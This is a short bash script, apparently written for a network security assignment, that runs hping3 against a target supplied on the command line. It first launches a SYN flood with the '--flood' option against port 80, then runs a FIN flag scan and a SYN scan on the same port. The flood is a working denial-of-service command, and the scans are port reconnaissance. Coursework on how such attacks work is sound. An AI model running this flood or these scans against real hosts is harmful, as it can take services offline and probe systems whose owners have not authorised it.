#!/bin/bash
# hping3 scan scripts for Assignment

if [ -z "$1" ]; then
  echo "Usage: $0 <target>"
  exit 1
fi
TARGET=$1

echo "SYN Flood Attack"
hping3 -S "$TARGET" -p 80 --flood

echo "FIN Flag Scan"
hping3 --fin "$TARGET" -p 80

echo "SYN Scan"
hping3 -S "$TARGET" -p 80
